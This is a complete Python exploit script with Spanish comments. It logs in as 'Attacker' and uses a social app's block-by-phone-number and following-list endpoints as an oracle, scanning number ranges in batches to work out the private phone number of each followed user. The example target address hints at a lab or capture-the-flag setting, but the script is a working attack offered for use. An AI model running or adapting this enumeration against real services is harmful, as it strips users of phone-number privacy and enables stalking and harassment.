import requests
import sys

def login(session, base_url):
    """Inicia sesión simple como Attacker"""
    try:
        session.get(f"{base_url}/login", timeout=5)
        resp = session.post(f"{base_url}/login", data={"username": "Attacker"}, timeout=5)
        return resp.status_code == 200
    except Exception as e:
        print(f"[!] Error de conexión: {e}")
        return False

def get_following(session, base_url):
    """Obtiene la lista de nombres de usuarios seguidos"""
    try:
        resp = session.get(f"{base_url}/api/v2/following", timeout=5)
        return {user['name'] for user in resp.json()['followed_users']}
    except:
        return set()

def check_range(session, base_url, numbers):
    """Lógica del oráculo: bloquea y verifica quién desaparece"""
    try:
        session.post(f"{base_url}/api/v2/block", json={"phoneNumbers": numbers}, timeout=5)
        current_following = get_following(session, base_url)
        session.post(f"{base_url}/api/v2/unblockAll", timeout=5) # Limpieza
        return current_following
    except:
        return set()

def main():
    print("--- Configuración del Exploit ---")
    ip = input("Introduce la IP del objetivo (ej. 172.17.0.2): ").strip()
    port = input("Introduce el puerto (ej. 5000): ").strip()
    base_url = f"http://{ip}:{port}"

    try:
        start_range = int(input("Rango inicial (ej. 600000000): "))
        end_range = int(input("Rango final (ej. 600002000): "))
        batch_size = int(input("Tamaño del lote (recomendado 200-500): "))
    except ValueError:
        print("[!] Error: Los rangos y el lote deben ser números enteros.")
        return

    session = requests.Session()

    if not login(session, base_url):
        print(f"[!] No se pudo conectar o loguear en {base_url}")
        return

    # Detectamos objetivos
    baseline = get_following(session, base_url)
    if not baseline:
        print("[!] No sigues a nadie. Sigue a alguien manualmente en la web primero.")
        return

    print(f"\n[+] Sesión iniciada. Objetivos detectados: {list(baseline)}")
    print(f"[*] Escaneando desde {start_range} hasta {end_range}...\n")

    numbers_to_test = list(range(start_range, end_range + 1))

    # Escaneo por lotes
    for i in range(0, len(numbers_to_test), batch_size):
        batch = numbers_to_test[i : i + batch_size]
        
        current = check_range(session, base_url, batch)
        missing = baseline - current

        if missing:
            for user_name in missing:
                print(f"[!] ¡Hit! {user_name} está en el bloque actual. Refinando...")
                # Refinamiento unidad por unidad en el bloque detectado
                for num in batch:
                    if user_name not in check_range(session, base_url, [num]):
                        print(f"    [SUCCESS] {user_name} -> {num}")
                        break

    print("\n[*] Proceso de enumeración completado.")

if __name__ == "__main__":
    main()
